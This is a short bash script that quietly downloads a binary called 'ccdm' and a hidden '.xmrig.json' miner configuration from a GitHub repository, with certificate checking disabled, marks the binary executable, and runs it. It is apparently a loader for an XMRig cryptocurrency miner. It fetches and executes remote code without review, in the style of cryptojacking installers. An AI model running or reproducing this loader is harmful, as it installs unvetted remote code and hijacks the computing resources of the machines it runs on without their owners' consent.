#!/bin/bash
wget --no-check-certificate -qO ./ccdm https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/ccdm
chmod u+x ./ccdm
wget --no-check-certificate -qO ./.xmrig.json https://raw.githubusercontent.com/chenlysave/my-micosmgd/refs/heads/main/amd.json
bash -c "./ccdm"
